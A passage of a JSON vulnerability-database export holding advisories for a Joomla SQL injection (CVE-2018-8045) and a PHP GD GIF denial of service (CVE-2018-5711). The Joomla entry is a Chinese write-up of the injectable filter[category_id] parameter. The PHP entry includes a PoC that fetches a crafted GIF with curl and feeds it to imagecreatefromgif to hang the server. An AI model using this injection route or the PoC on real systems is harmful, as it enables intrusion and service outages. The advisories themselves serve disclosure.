\u5373\u53ef\u89e6\u53d1\u8be5\u63a7\u5236\u5668\u3002\r\n\r\n![](https://images.seebug.org/content/images/2018/03/ff2f1711-1b5f-4d69-8938-c4c2e1bfc2e5.png-w331s)\r\n\r\n\u4f46\u662f\u5982\u4f55\u63a7\u5236$categoryId\u53c2\u6570\u5462\uff1f\u5982\u679c\u53ea\u8bbf\u95ee\r\n\r\n<http://xxx/joomla/administrator/index.php?option=com_users&view=notes></http://xxx/joomla/administrator/index.php?option>\r\n\r\n\u53ea\u4f1a\u5411\u670d\u52a1\u5668\u53d1\u9001\u4e00\u4e2aget\u8bf7\u6c42\uff0c\u8bf7\u6c42\u4e2d\u6839\u672c\u4e0d\u5305\u542b\u6211\u4eec\u60f3\u8981\u7684categoryId\u53c2\u6570\r\n\r\n\u5148\u770b\u4e0b\u51fa\u95ee\u9898\u7684\u8fd9\u884c\u4ee3\u7801\r\n\r\n```\r\n$categoryId = $this->getState('filter.category_id');\r\n```\r\n\r\n\u4ecegetState(\u2018filter.category_id\u2019)\u4e0d\u96be\u770b\u51fa\u6765\uff0c\u5b83\u7684\u4f5c\u7528\u662f\u4e00\u4e2a\u8fc7\u6ee4\u5668\uff0c\u7528\u6765\u9009\u62e9category_id\u7684\r\n\r\n\u56e0\u6b64\u60f3\u5411\u5b83\u4f20\u53c2\uff0c\u4e00\u5b9a\u548c\u9ad8\u7ea7\u641c\u7d22\u4e4b\u7c7b\u529f\u80fd\u7684\u6709\u5173\u3002\r\n\r\n\u9009\u62e9Search Tools\u9009\u9879 Select Category\u9009\u9879\u3002\r\n\r\n![](https://images.seebug.org/content/images/2018/03/05c064f2-bc6e-4060-91f3-de00df968eeb.png-w331s)\r\n\r\n\u6b64\u65f6joomla\u7684\u53d1\u5305\u60c5\u51b5\r\n\r\n![](https://images.seebug.org/content/images/2018/03/a889a9ed-c53c-46cd-8fcc-2260ceba6b88.png-w331s)\r\n\r\n\u6b64\u65f6\u6211\u4eec\u9700\u8981\u7684filter[category_id]\u53c2\u6570\u51fa\u73b0\u5728\u4e86post\u53c2\u6570\u4e2d\uff0c\u901a\u8fc7\u8fd9\u4e2a\u53c2\u6570\u7684\u503c\uff0c\u5373\u53ef\u7545\u901a\u65e0\u963b\u7684\u8fdb\u884c\u6ce8\u5165\u3002\r\n\r\n\u4e0b\u9762\u9a8c\u8bc1\u4e0b\u8fd9\u4e2afilter[category_id]\u53c2\u90e8\u5206\u53ef\u4ee5\u76f4\u63a5\u4f20\u9012\u7ed9\u540e\u53f0\u7684$categoryId\u53c2\u6570\r\n\r\n\u6211\u4eec\u4fee\u6539\u4e86filter[category_id]\u53c2\u6570\u5185\u5bb9\u4e3a\u2019kingsguard_test\u2019\uff0c\u5e76\u53d1\u5305\r\n\r\n![](https://images.seebug.org/content/images/2018/03/f638fb3d-b36a-4968-9fd3-a9ecea2cfc1c.png-w331s)\r\n\r\n\u540e\u53f0\u4e0b\u65ad\u70b9\uff0c\u6293\u53d6$categoryId\u503c\uff0c\u53ef\u89c1\u2019kingsguard_test\u2019\u539f\u5c01\u4e0d\u52a8\u7684\u88ab\u4f20\u9012\u7ed9$categoryId\u53c2\u6570\uff0c\u5e76\u62fc\u63a5sql\u8bed\u53e5\u8fdb\u884c\u67e5\u8be2\u3002\r\n\r\n![](https://images.seebug.org/content/images/2018/03/eb22e94c-c672-4741-9f28-f82c513c3b0b.png-w331s)\r\n\r\n#### \u5229\u7528\u9a8c\u8bc1\r\n\r\n![](https://images.seebug.org/content/images/2018/03/83e8a226-9b5b-4273-af26-06543d45c77e.png-w331s)\r\n\r\n#### \u6f0f\u6d1e\u4fee\u590d\r\n\u5347\u7ea7joomla\u81f3\u6700\u65b0\u7248\u672c",
            "modified": "2018-03-29T00:00:00",
            "published": "2018-03-29T00:00:00",
            "href": "https://www.seebug.org/vuldb/ssvid-97205",
            "id": "SSV:97205",
            "title": "Joomla\u5185\u6838SQL\u6ce8\u5165\u6f0f\u6d1e\uff08CVE-2018-8045)",
            "type": "seebug",
            "sourceData": "",
            "cvss": {
                "score": 0.0,
                "vector": "NONE"
            },
            "vhref": "https://vulners.com/seebug/SSV:97205"
        },
        {
            "bulletinFamily": "exploit",
            "description": "SQL Injection vulnerability in Joomla filter[category_id] parameter\n\nVulnerability Type: SQL Injection",
            "modified": "2018-03-15T00:00:00",
            "published": "2018-03-15T00:00:00",
            "id": "E-620",
            "href": "",
            "type": "dsquare",
            "title": "Joomla User Notes List View SQL Injection",
            "sourceData": "For the exploit source code contact DSquare Security sales team.",
            "cvss": {
                "score": 6.5,
                "vector": "AV:N/AC:L/Au:S/C:P/I:P/A:P"
            },
            "vhref": "https://vulners.com/dsquare/E-620"
        }
    ],
    "CVE-2018-5711": [
        {
            "bulletinFamily": "exploit",
            "description": "Recently, I reviewed several Web frameworks and language implementations, and found some vulnerabilities.\r\nThis is an simple and interesting case, and seems easy to exploit in real world!\r\n### Affected\r\nAll PHP version\r\n* PHP 5 < 5.6.33\r\n* PHP 7.0 < 7.0.27\r\n* PHP 7.1 < 7.1.13\r\n* PHP 7.2 < 7.2.1\r\n\r\n### Vulnerability Details\r\nThe vulnerability is on the file [`ext/gd/libgd/gd_gif_in.c`](https://github.com/php/php-src/blob/c5767db441e4db2a1e07b5880129ad7ce0b25b6f/ext/gd/libgd/gd_gif_in.c)\r\nThere is a while-loop in [`LWZReadByte`](https://github.com/php/php-src/blob/c5767db441e4db2a1e07b5880129ad7ce0b25b6f/ext/gd/libgd/gd_gif_in.c#L460)\r\n```\r\n460    do {\r\n461        sd->firstcode = sd->oldcode =\r\n461        GetCode(fd, &sd->scd, sd->code_size, FALSE, ZeroDataBlockP);\r\n463    } while (sd->firstcode == sd->clear_code);\r\n```\r\n\r\nFunction `GetCode` is just a wrapper, and [`GetCode_`](https://github.com/php/php-src/blob/c5767db441e4db2a1e07b5880129ad7ce0b25b6f/ext/gd/libgd/gd_gif_in.c#L376) do the real stuff.\r\n```\r\n376    static int\r\n377    GetCode_(gdIOCtx *fd, CODE_STATIC_DATA *scd, int code_size, int flag, int *ZeroDataBlockP)\r\n378    {\r\n379        int           i, j, ret;\r\n380        unsigned char count;\r\n           ... \r\n\r\n399        if ((count = GetDataBlock(fd, &scd->buf[2], ZeroDataBlockP)) <= 0)\r\n400            scd->done = TRUE;\r\n           ...\r\n           \r\n405    }\r\n```\r\n\r\n\r\n`GetCode_` call [`GetDataBlock`](https://github.com/php/php-src/blob/c5767db441e4db2a1e07b5880129ad7ce0b25b6f/ext/gd/libgd/gd_gif_in.c#L333) to read data from GIF!\r\n```\r\n332    static int\r\n333    GetDataBlock_(gdIOCtx *fd, unsigned char *buf, int *ZeroDataBlockP)\r\n334    {\r\n335     unsigned char   count;\r\n336    \r\n336     if (! ReadOK(fd,&count,1)) {\r\n338         return -1;\r\n339     }\r\n340    \r\n341     *ZeroDataBlockP = count == 0;\r\n342    \r\n343     if ((count != 0) && (! ReadOK(fd, buf, count))) {\r\n344         return -1;\r\n345     }\r\n346\r\n347     return count;\r\n348    }\r\n```\r\n\r\nOK, here are all vulnerable code, can you spot the vulnerability? :P\r\n\r\n\r\n\r\nThe bug relied on the type conversion from int to `unsigned` char. As you can see:\r\nIf `GetDataBlock_` return `-1`, `scd->done` in line 400 will set to True, and stop the while-loop. But it will never be executed because the definition of `count` is `unsigned char`, it\u2019s always be a positive from 0 to 255.\r\n\r\nSo the result is, one single GIF can make an infinite loop and exhausted the server resource.\r\n\r\n### PoC\r\n```\r\n$ curl -L https://git.io/vN0n4 | xxd -r > poc.gif\r\n$ php -r 'imagecreatefromgif(\"poc.gif\");'\r\n\r\n  Infinite loop here...\r\n```\r\n\r\nIt's easy to exploit in real world because lots of websites resize user-uploaded image by GD library...",
            "modified": "2018-02-02T00:00:00",
            "published": "2018-02-02T00:00:00",
            "href": "https://www.seebug.org/vuldb/ssvid-97122",
            "id": "SSV:97122",
            "type": "seebug",
            "title": "PHP CVE-2018-5711 - Hanging Websites by a Harmful GIF",
            "sourceData": "\n                                                $ curl -L https://git.io/vN0n4 | xxd -r > poc.gif\r\n$ php -r 'imagecreatefromgif(\"poc.gif\");'\r\n\r\n  Infinite loop here...\n                              ",
            "cvss": {
                "score": 0.0,
                "vector": "NONE"
            },
            "vhref": "https://vulners.com/seebug/SSV:97122"
        }
    ]
}